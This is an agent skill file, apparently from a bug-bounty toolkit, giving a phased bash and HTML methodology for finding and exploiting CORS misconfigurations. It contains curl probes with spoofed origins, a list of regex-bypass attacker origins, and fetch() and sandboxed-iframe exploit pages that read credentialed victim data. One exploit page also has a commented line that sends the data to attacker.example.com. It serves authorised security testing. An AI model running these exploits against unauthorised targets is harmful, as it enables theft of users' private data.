---
name: cors-hunter
description: Systematically hunt for Cross-Origin Resource Sharing (CORS) misconfigurations across all API surfaces. Covers wildcard origins, reflected Origin header (ACAO mirrors request Origin), null origin bypass, subdomain/prefix/suffix trust confusion, protocol downgrade (HTTP trusted from HTTPS), credentialed CORS with ACAO:*, pre-flight bypass, CORS on sensitive endpoints (account data, tokens, admin APIs), and exploitation via fetch()-based PoC pages. Trigger on phrases like "cors", "cors-hunter", "cross-origin", "ACAO header", "Access-Control-Allow-Origin", or when recon reveals API endpoints returning JSON user data, auth tokens, or admin functionality.
---

# CORS Hunter Skill

CORS misconfigurations are one of the most consistently rewarded bug classes on every major platform — they are easy to miss in code review, trivially exploitable with a fetch()-based PoC, and carry High to Critical severity when they expose authenticated API endpoints. The attack surface extends well beyond `Access-Control-Allow-Origin: *` on a public endpoint; the real findings live in credentialed CORS (ACAC: true + reflected ACAO), subdomain trust chains, null origin bypasses, and CORS on private/admin APIs.

Run phases in order. Phase 1 maps the attack surface before any active testing. Phase 2 covers the full misconfiguration matrix. Phase 3 produces the fetch()-based PoC. Every finding requires a working exploit page, not just a header observation.

---

## Prerequisites

- Session cookie / Bearer token for an authenticated test account
- A domain you control for hosting the PoC exploit page (or use a public HTML sandbox like JSFiddle / CodeSandbox)
- Burp Suite for header manipulation and response inspection
- All target hosts confirmed IN SCOPE via `/scope-checker` before active testing

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/cors

# Quick CORS header check on the root and a known API endpoint
echo "[*] Checking CORS headers..."
curl -skI "https://$TARGET_DOMAIN/api/v1/user" \
  -H "Origin: https://attacker.example.com" \
  -H "Cookie: $SESSION_COOKIE" | \
  grep -iE "access-control|vary"
```

---

## Phase 1 — Surface Enumeration

### Step 1.1 — Collect All API Endpoints

```bash
# Pull all endpoints from recon output
cat $TARGET_DIR/recon/api/all-endpoints.txt \
    $TARGET_DIR/recon/api/katana-crawl.txt \
    $TARGET_DIR/recon/js/endpoints-extracted.txt 2>/dev/null | \
  grep -iE '\.(json|xml)|/api/|/v[0-9]+/|/graphql|/rest/|/data/' | \
  sort -u > $TARGET_DIR/recon/cors/api-endpoints.txt

echo "[*] API endpoints to test: $(wc -l < $TARGET_DIR/recon/cors/api-endpoints.txt)"
```

### Step 1.2 — Identify High-Value Endpoints

CORS on a public static asset is Informational. Prioritise endpoints that return sensitive data:

```bash
# Probe endpoints and flag those returning sensitive-looking JSON
while IFS= read -r EP; do
  RESP=$(curl -sk "$EP" \
    -H "Cookie: $SESSION_COOKIE" \
    -H "Authorization: Bearer $TOKEN" \
    --max-time 8)
  if echo "$RESP" | grep -qiE '"email"|"token"|"api_key"|"secret"|"password"|"ssn"|"credit|"phone"|"address"|"role"|"admin"|"balance"|"account"'; then
    echo "[SENSITIVE] $EP"
    echo "$EP" >> $TARGET_DIR/recon/cors/sensitive-endpoints.txt
  fi
done < $TARGET_DIR/recon/cors/api-endpoints.txt

echo "[*] Sensitive endpoints: $(wc -l < $TARGET_DIR/recon/cors/sensitive-endpoints.txt 2>/dev/null || echo 0)"
cat $TARGET_DIR/recon/cors/sensitive-endpoints.txt 2>/dev/null
```

### Step 1.3 — Enumerate Subdomains in Scope

Subdomain trust is a critical CORS vector. Build a full list of in-scope subdomains:

```bash
# Use existing subdomain recon output
cat $TARGET_DIR/recon/subdomains/alive-subdomains.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/cors/in-scope-subdomains.txt

echo "[*] In-scope subdomains: $(wc -l < $TARGET_DIR/recon/cors/in-scope-subdomains.txt)"
cat $TARGET_DIR/recon/cors/in-scope-subdomains.txt | head -20
```

---

## Phase 2 — CORS Misconfiguration Matrix

### Step 2.1 — Reflected Origin (Mirror Any Origin)

The most dangerous misconfiguration: server reflects whatever `Origin` header the request contains back in `Access-Control-Allow-Origin`, combined with `Access-Control-Allow-Credentials: true`.

```bash
mkdir -p $TARGET_DIR/recon/cors/findings

while IFS= read -r EP; do
  # Test: does server mirror our attacker origin with credentials?
  HEADERS=$(curl -skI "$EP" \
    -H "Origin: https://attacker.example.com" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
  ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r')

  if echo "$ACAO" | grep -qi "attacker.example.com"; then
    echo "[REFLECT] $EP"
    echo "  ACAO: $ACAO"
    echo "  ACAC: $ACAC"
    if echo "$ACAC" | grep -qi "true"; then
      echo "  [CRITICAL] Credentialed reflected ACAO — exploitable with fetch()+credentials"
      echo "CRITICAL|REFLECT|$EP" >> $TARGET_DIR/recon/cors/findings/confirmed.txt
    else
      echo "  [LOW] Reflected ACAO without credentials — limited impact"
    fi
  fi
done < $TARGET_DIR/recon/cors/sensitive-endpoints.txt
```

### Step 2.2 — Wildcard ACAO with Credentials

`Access-Control-Allow-Origin: *` is spec-invalid when paired with `Access-Control-Allow-Credentials: true`, but some frameworks serve it anyway. Browsers block the fetch, but non-browser clients honour it.

```bash
while IFS= read -r EP; do
  HEADERS=$(curl -skI "$EP" \
    -H "Origin: https://attacker.example.com" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
  ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r')

  if echo "$ACAO" | grep -q "\*" && echo "$ACAC" | grep -qi "true"; then
    echo "[WILDCARD+CRED] $EP"
    echo "  $ACAO | $ACAC"
    echo "  [HIGH] Wildcard + credentials — non-browser clients can exploit this"
    echo "HIGH|WILDCARD_CRED|$EP" >> $TARGET_DIR/recon/cors/findings/confirmed.txt
  fi
done < $TARGET_DIR/recon/cors/sensitive-endpoints.txt
```

### Step 2.3 — Null Origin Bypass

Some servers whitelist `null` as a trusted origin — intended for file:// or sandboxed iframes during development, but exploitable via a sandboxed iframe on an attacker page.

```bash
while IFS= read -r EP; do
  HEADERS=$(curl -skI "$EP" \
    -H "Origin: null" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
  ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r')

  if echo "$ACAO" | grep -qi "null"; then
    echo "[NULL ORIGIN] $EP"
    echo "  ACAO: $ACAO | ACAC: $ACAC"
    if echo "$ACAC" | grep -qi "true"; then
      echo "  [HIGH] Null origin trusted with credentials"
      echo "  Exploit: sandboxed iframe on attacker page sends Origin: null"
      echo "HIGH|NULL_ORIGIN|$EP" >> $TARGET_DIR/recon/cors/findings/confirmed.txt
    fi
  fi
done < $TARGET_DIR/recon/cors/sensitive-endpoints.txt
```

### Step 2.4 — Subdomain Trust (Any Subdomain Trusted)

If the server trusts any subdomain of the target domain, a single XSS on any subdomain becomes a CORS bypass. Also covers subdomain takeover chains (see `/subdomain-takeover`).

```bash
while IFS= read -r EP; do
  # Test with a non-existent subdomain — does server trust *.target.com?
  FAKE_SUB="cors-test-attacker.$TARGET_DOMAIN"
  HEADERS=$(curl -skI "$EP" \
    -H "Origin: https://$FAKE_SUB" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
  ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r')

  if echo "$ACAO" | grep -qi "$FAKE_SUB"; then
    echo "[SUBDOMAIN WILDCARD] $EP"
    echo "  ACAO: $ACAO | ACAC: $ACAC"
    echo "  [HIGH] Any subdomain trusted — XSS on any subdomain = full CORS bypass"
    echo "HIGH|SUBDOMAIN_WILDCARD|$EP" >> $TARGET_DIR/recon/cors/findings/confirmed.txt

    # Cross-reference with takeover candidates from subdomain recon
    echo "  [*] Checking for takeover candidates in-scope subdomains..."
    cat $TARGET_DIR/recon/cors/in-scope-subdomains.txt 2>/dev/null | head -10
  fi
done < $TARGET_DIR/recon/cors/sensitive-endpoints.txt
```

### Step 2.5 — Prefix / Suffix Trust Confusion

Faulty regex validation: `^https://target\.com` matches `https://target.com.attacker.com`. Or `target\.com$` matches `https://attacker-target.com`.

```bash
while IFS= read -r EP; do
  DOMAIN_ROOT=$(echo "$TARGET_DOMAIN" | sed 's/www\.//')

  BYPASS_ORIGINS=(
    # Suffix bypass: attacker domain ending in target domain
    "https://evil-${DOMAIN_ROOT}"
    "https://attacker.${DOMAIN_ROOT}.evil.com"
    # Prefix bypass: attacker subdomain starting with target domain
    "https://${DOMAIN_ROOT}.attacker.com"
    "https://${DOMAIN_ROOT}.evil.io"
    # Protocol confusion
    "http://${DOMAIN_ROOT}"
    "http://www.${DOMAIN_ROOT}"
    # Underscore (sometimes bypasses regex)
    "https://cors_${DOMAIN_ROOT}"
  )

  for ORIGIN in "${BYPASS_ORIGINS[@]}"; do
    HEADERS=$(curl -skI "$EP" \
      -H "Origin: $ORIGIN" \
      -H "Cookie: $SESSION_COOKIE" \
      --max-time 8)

    ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
    ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r')

    if echo "$ACAO" | grep -qi "$(echo $ORIGIN | sed 's|https\?://||')"; then
      echo "[PREFIX/SUFFIX] $EP"
      echo "  Origin used: $ORIGIN"
      echo "  ACAO: $ACAO | ACAC: $ACAC"
      if echo "$ACAC" | grep -qi "true"; then
        echo "  [HIGH] Regex bypass with credentials"
        echo "HIGH|REGEX_BYPASS|$EP|$ORIGIN" >> $TARGET_DIR/recon/cors/findings/confirmed.txt
      fi
    fi
  done
done < $TARGET_DIR/recon/cors/sensitive-endpoints.txt
```

### Step 2.6 — HTTP Trusted from HTTPS (Protocol Downgrade)

If the HTTPS API trusts an HTTP origin, an attacker on the network can MitM the HTTP request to steal the response.

```bash
while IFS= read -r EP; do
  HEADERS=$(curl -skI "$EP" \
    -H "Origin: http://$TARGET_DOMAIN" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
  ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r')

  if echo "$ACAO" | grep -qi "http://"; then
    echo "[PROTOCOL DOWNGRADE] $EP"
    echo "  ACAO: $ACAO | ACAC: $ACAC"
    echo "  [MEDIUM] HTTPS API trusts HTTP origin — MitM network attack vector"
    echo "MEDIUM|PROTOCOL_DOWNGRADE|$EP" >> $TARGET_DIR/recon/cors/findings/confirmed.txt
  fi
done < $TARGET_DIR/recon/cors/sensitive-endpoints.txt
```

### Step 2.7 — CORS on Admin / Internal Endpoints

Admin endpoints with permissive CORS are Critical regardless of whether credentials are forwarded — any trusted origin can exfiltrate admin data.

```bash
ADMIN_PATHS=(
  "/admin" "/admin/api" "/api/admin" "/management"
  "/internal" "/api/internal" "/v1/admin"
  "/superuser" "/staff" "/ops" "/backstage"
  "/api/v1/users" "/api/v1/accounts" "/api/v1/config"
  "/api/v1/tokens" "/api/v1/keys" "/api/v1/secrets"
)

for PATH in "${ADMIN_PATHS[@]}"; do
  HEADERS=$(curl -skI "https://$TARGET_DOMAIN$PATH" \
    -H "Origin: https://attacker.example.com" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  STATUS=$(echo "$HEADERS" | grep -oP "HTTP/\d\.?\d? \K\d+")
  ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
  ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r')

  if [ -n "$ACAO" ] && [ "$STATUS" != "404" ]; then
    echo "[ADMIN CORS] https://$TARGET_DOMAIN$PATH [HTTP $STATUS]"
    echo "  ACAO: $ACAO | ACAC: $ACAC"
    echo "ADMIN|$STATUS|https://$TARGET_DOMAIN$PATH" >> $TARGET_DIR/recon/cors/findings/confirmed.txt
  fi
done
```

### Step 2.8 — Pre-flight Bypass (Non-Simple Requests)

Some CORS implementations only restrict simple requests (GET/POST with basic headers) but allow all pre-flight (OPTIONS) requests, creating a bypass for custom-header or PUT/DELETE requests.

```bash
while IFS= read -r EP; do
  # Send OPTIONS pre-flight with attacker origin
  HEADERS=$(curl -skI -X OPTIONS "$EP" \
    -H "Origin: https://attacker.example.com" \
    -H "Access-Control-Request-Method: GET" \
    -H "Access-Control-Request-Headers: Authorization, X-Custom-Header" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
  ACAM=$(echo "$HEADERS" | grep -i "^access-control-allow-methods:" | tr -d '\r')
  ACAH=$(echo "$HEADERS" | grep -i "^access-control-allow-headers:" | tr -d '\r')
  ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r')

  if echo "$ACAO" | grep -qi "attacker.example.com\|\*"; then
    echo "[PREFLIGHT] $EP"
    echo "  $ACAO | $ACAM | $ACAH | $ACAC"
    # Cross-check: does the same GET request also reflect attacker origin?
    GET_ACAO=$(curl -skI "$EP" \
      -H "Origin: https://attacker.example.com" \
      -H "Cookie: $SESSION_COOKIE" --max-time 8 | \
      grep -i "^access-control-allow-origin:")
    [ -z "$GET_ACAO" ] && \
      echo "  [MEDIUM] Pre-flight allows attacker origin but actual GET does not — partial bypass"
  fi
done < $TARGET_DIR/recon/cors/sensitive-endpoints.txt
```

### Step 2.9 — Vary Header Analysis (Cache Poisoning Interaction)

If a CORS-permissive endpoint lacks `Vary: Origin`, a cached response with `ACAO: https://attacker.com` can be served to all users — combining CORS misconfig with cache poisoning (see `/cache-poisoning-hunter`).

```bash
while IFS= read -r EP; do
  HEADERS=$(curl -skI "$EP" \
    -H "Origin: https://attacker.example.com" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r')
  VARY=$(echo "$HEADERS" | grep -i "^vary:" | tr -d '\r')
  CACHE=$(echo "$HEADERS" | grep -iE "^(x-cache|cf-cache-status|age):" | tr -d '\r')

  if [ -n "$ACAO" ] && ! echo "$VARY" | grep -qi "origin"; then
    echo "[NO VARY:ORIGIN] $EP"
    echo "  ACAO: $ACAO"
    echo "  Vary: ${VARY:-not present}"
    echo "  Cache: ${CACHE:-not present}"
    if [ -n "$CACHE" ]; then
      echo "  [!] CORS + cached response without Vary: Origin — run /cache-poisoning-hunter"
    fi
  fi
done < $TARGET_DIR/recon/cors/sensitive-endpoints.txt
```

---

## Phase 3 — Exploitation: fetch()-Based PoC

### Step 3.1 — Generate PoC HTML Page

Every CORS finding requires a working PoC exploit page. Generate one tailored to the confirmed misconfiguration:

```bash
VULN_ENDPOINT="[replace with confirmed vulnerable endpoint]"

cat > $TARGET_DIR/recon/cors/poc.html << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS PoC</title>
</head>
<body>
  <h2>CORS Misconfiguration PoC</h2>
  <p>Target: <code>$VULN_ENDPOINT</code></p>
  <pre id="output">Waiting for response...</pre>

  <script>
    // Variant A: Credentialed fetch (for reflected ACAO + ACAC: true)
    fetch('$VULN_ENDPOINT', {
      method: 'GET',
      credentials: 'include',   // sends victim's cookies
      headers: {
        'Accept': 'application/json'
      }
    })
    .then(r => r.text())
    .then(data => {
      document.getElementById('output').textContent = data;
      // In a real attack: send data to attacker server
      // fetch('https://attacker.example.com/collect?d=' + encodeURIComponent(data));
    })
    .catch(e => {
      document.getElementById('output').textContent = 'Error: ' + e.message;
    });
  </script>
</body>
</html>
HTMLEOF

echo "[*] PoC saved: $TARGET_DIR/recon/cors/poc.html"
echo "[*] Host this file on your attacker domain and load in a browser"
echo "    that is logged in to $TARGET_DOMAIN as the victim"
```

### Step 3.2 — Null Origin PoC (Sandboxed Iframe)

For `Origin: null` trust, the PoC must be served inside a sandboxed iframe:

```bash
cat > $TARGET_DIR/recon/cors/poc-null-origin.html << HTMLEOF
<!DOCTYPE html>
<html>
<head><title>CORS Null Origin PoC</title></head>
<body>
<h2>Null Origin CORS PoC</h2>
<pre id="output">Loading...</pre>

<!-- sandbox attribute causes browser to send Origin: null -->
<iframe sandbox="allow-scripts allow-forms"
        srcdoc="<script>
  fetch('$VULN_ENDPOINT', {
    credentials: 'include'
  })
  .then(r => r.text())
  .then(d => parent.document.getElementById('output').textContent = d)
  .catch(e => parent.document.getElementById('output').textContent = 'Error: ' + e);
</script>"
        style="display:none">
</iframe>
</body>
</html>
HTMLEOF

echo "[*] Null origin PoC saved: $TARGET_DIR/recon/cors/poc-null-origin.html"
```

### Step 3.3 — Validate PoC in Browser

```bash
echo "=== PoC Validation Steps ==="
echo ""
echo "1. Open browser, log in to https://$TARGET_DOMAIN as your test account"
echo ""
echo "2. In the SAME browser, open poc.html from your attacker domain"
echo "   (or paste contents into jsfiddle.net / codepen.io temporarily)"
echo ""
echo "3. Open DevTools → Network tab"
echo ""
echo "4. Expected result for confirmed finding:"
echo "   - The fetch() response in Network tab shows the authenticated JSON response"
echo "   - The #output element on the page shows your account data"
echo "   - Response headers include: Access-Control-Allow-Origin: [your origin]"
echo "                               Access-Control-Allow-Credentials: true"
echo ""
echo "5. Screenshot requirements for report:"
echo "   a) The PoC page displaying victim account data"
echo "   b) DevTools Network tab showing the cross-origin fetch with CORS headers"
echo "   c) The vulnerable endpoint response headers in Burp/DevTools"
```

---

## Phase 4 — Automated Sweep

### Step 4.1 — Batch Scan All API Endpoints

```bash
# Full sweep: test all API endpoints against 5 key origin variants
mkdir -p $TARGET_DIR/recon/cors/sweep

TEST_ORIGINS=(
  "https://attacker.example.com"
  "null"
  "http://$TARGET_DOMAIN"
  "https://cors-test-attacker.$TARGET_DOMAIN"
  "https://$TARGET_DOMAIN.attacker.com"
)

while IFS= read -r EP; do
  for ORIGIN in "${TEST_ORIGINS[@]}"; do
    HEADERS=$(curl -skI "$EP" \
      -H "Origin: $ORIGIN" \
      -H "Cookie: $SESSION_COOKIE" \
      --max-time 8 2>/dev/null)

    ACAO=$(echo "$HEADERS" | grep -i "^access-control-allow-origin:" | tr -d '\r\n')
    ACAC=$(echo "$HEADERS" | grep -i "^access-control-allow-credentials:" | tr -d '\r\n')

    # Only log if ACAO present and reflects our origin (not a miss or different value)
    if [ -n "$ACAO" ]; then
      ORIGIN_CLEAN=$(echo "$ORIGIN" | sed 's|https\?://||')
      if echo "$ACAO" | grep -qi "$ORIGIN_CLEAN\|\*"; then
        echo "$EP | ORIGIN: $ORIGIN | $ACAO | $ACAC"
      fi
    fi
  done
done < $TARGET_DIR/recon/cors/api-endpoints.txt \
  | tee $TARGET_DIR/recon/cors/sweep/all-cors-hits.txt

echo "[*] Total CORS hits: $(wc -l < $TARGET_DIR/recon/cors/sweep/all-cors-hits.txt)"

# Separate credentialed hits (highest priority)
grep -i "credentials.*true\|true.*credentials" \
  $TARGET_DIR/recon/cors/sweep/all-cors-hits.txt | \
  tee $TARGET_DIR/recon/cors/sweep/credentialed-hits.txt
echo "[*] Credentialed CORS hits: $(wc -l < $TARGET_DIR/recon/cors/sweep/credentialed-hits.txt)"
```

### Step 4.2 — Use corsy for Automated Detection

```bash
# corsy: fast CORS misconfiguration scanner
# Install: pip3 install corsy OR git clone https://github.com/s0md3v/Corsy
pip3 install corsy 2>/dev/null || git clone https://github.com/s0md3v/Corsy ~/tools/Corsy 2>/dev/null

# Single URL
python3 ~/tools/Corsy/corsy.py -u "https://$TARGET_DOMAIN/api/v1/user" \
  -H "Cookie: $SESSION_COOKIE" 2>/dev/null

# Bulk scan
python3 ~/tools/Corsy/corsy.py \
  -i $TARGET_DIR/recon/cors/sensitive-endpoints.txt \
  -H "Cookie: $SESSION_COOKIE" \
  -t 10 \
  --headers 2>/dev/null | tee $TARGET_DIR/recon/cors/corsy-results.txt

echo "[*] corsy results: $TARGET_DIR/recon/cors/corsy-results.txt"
```

---

## Phase 5 — Validation Standard

```bash
echo "=== CORS VALIDATION CHECKLIST ==="
echo ""
echo "A CORS finding is valid ONLY when ALL of the following are confirmed:"
echo ""
echo "1. The endpoint returns SENSITIVE data (authenticated account info, tokens,"
echo "   PII, admin data) — not just a public page or static asset."
echo ""
echo "2. The CORS headers are present on the ACTUAL response, not just on OPTIONS."
echo "   Confirm with: curl -sk [EP] -H 'Origin: [ORIGIN]' — check ACAO on GET/POST."
echo ""
echo "3. Access-Control-Allow-Credentials: true is present (for credentialed exploits)."
echo "   Without ACAC:true, the browser blocks the response even if ACAO is permissive."
echo ""
echo "4. The fetch()-based PoC page ACTUALLY returns the victim's data in a browser."
echo "   Header observation alone is not a complete PoC. The exploit must work."
echo ""
echo "5. The origin used in the PoC is realistic — the attacker must be able to"
echo "   actually control that origin (own the domain, or use null via sandbox)."
echo ""
echo "=== DO NOT LOG THESE AS FINDINGS ==="
echo "- ACAO: * on public static assets (CSS, JS, fonts, images)"
echo "- ACAO: * WITHOUT ACAC: true on endpoints with no sensitive data"
echo "- CORS headers on a 404 or 403 response"
echo "- Reflected ACAO without ACAC: true — downgrade to Low/Informational"
echo "- OPTIONS pre-flight permissive without the actual response also being permissive"
```

---

## Phase 6 — Output Summary

```bash
echo "=== CORS Hunt Output ==="
ls -la $TARGET_DIR/recon/cors/
echo ""
echo "Key files:"
echo "  sensitive-endpoints.txt       — Endpoints returning sensitive JSON"
echo "  findings/confirmed.txt        — Confirmed misconfiguration per type"
echo "  sweep/all-cors-hits.txt       — All endpoints with any CORS response"
echo "  sweep/credentialed-hits.txt   — ACAC: true hits (highest priority)"
echo "  corsy-results.txt             — Automated scanner output"
echo "  poc.html                      — fetch()-based PoC (credentialed)"
echo "  poc-null-origin.html          — Sandboxed iframe PoC (null origin)"
echo ""
# Print summary of confirmed findings
if [ -f $TARGET_DIR/recon/cors/findings/confirmed.txt ]; then
  echo "=== Confirmed Findings ==="
  cat $TARGET_DIR/recon/cors/findings/confirmed.txt
fi
```

---

## Tooling Reference

| Tool | Purpose | Install |
|---|---|---|
| `curl` | Manual CORS header probing | Built-in on Kali |
| `corsy` | Automated CORS misconfiguration scanner | `pip3 install corsy` or GitHub: s0md3v/Corsy |
| Burp Suite | Header manipulation, Repeater, Param Miner | Pre-installed on Kali |
| Browser DevTools | PoC validation, Network tab inspection | Built-in |

---

## Severity Reference

| Finding | Severity |
|---|---|
| Reflected ACAO + ACAC: true on account/token/PII endpoint | Critical |
| Null origin trusted + ACAC: true on sensitive endpoint | High–Critical |
| Subdomain wildcard trust + ACAC: true (any subdomain XSS = full bypass) | High |
| Regex bypass (prefix/suffix confusion) + ACAC: true | High |
| CORS on admin/internal API + ACAC: true | Critical |
| Wildcard ACAO + ACAC: true (invalid per spec, exploitable non-browser) | High |
| CORS + missing Vary: Origin on cached endpoint (chained with cache poisoning) | High |
| Protocol downgrade (HTTP origin trusted by HTTPS API) + ACAC: true | Medium–High |
| Reflected ACAO without ACAC: true (browser blocks response) | Low–Informational |
| ACAO: * on unauthenticated public endpoint | Informational |
| Permissive pre-flight only, actual response not permissive | Informational |

---

## Guiding Principles

- **ACAC: true is the multiplier.** A reflected `ACAO` without `Access-Control-Allow-Credentials: true` is browser-blocked and largely unexploitable in standard cross-origin attacks. Do not overstate impact. The critical combination is reflected/null/subdomain ACAO *and* `ACAC: true` — that is what enables a credentialed `fetch()` to steal authenticated responses.
- **A working PoC is mandatory.** Observing CORS headers in Burp is reconnaissance, not a finding. The report must include a `fetch()`-based HTML page that, when loaded in a browser logged into the target, returns the victim's private data. No PoC = no report.
- **Public endpoints are Informational.** `ACAO: *` on `/api/v1/weather` or `/static/manifest.json` is by design. Every CORS test must begin by confirming the endpoint returns sensitive authenticated data. Skip all non-authenticated, non-sensitive endpoints.
- **Subdomain trust is a force multiplier.** A server that trusts `*.target.com` is one subdomain XSS away from full CORS bypass — even if all subdomains currently look clean. Cross-reference with `/subdomain-takeover` findings; a takeover on any trusted subdomain makes this Critical.
- **Check `Vary: Origin` before chaining with cache poisoning.** If a CORS-permissive endpoint is also cached and lacks `Vary: Origin`, the cached poisoned response is served to all users. This chains into a Critical. Run `/cache-poisoning-hunter` on any cached endpoint that fails the Vary check.
- **Don't conflate CORS with CSRF.** CORS controls whether a cross-origin page can *read* responses. CSRF is about whether a cross-origin page can *write* (trigger state changes). A site with `SameSite=Strict` cookies and no CORS misconfiguration is not vulnerable to CORS-based attacks. Confirm the cookies involved are readable via the cross-origin fetch before claiming account takeover.
- **Run /triager before submitting.** CORS misconfigs on major programs are frequently duplicated, especially on `/api/v1/me` and `/api/v1/user` endpoints. Check the program's disclosed reports before investing in a full write-up.
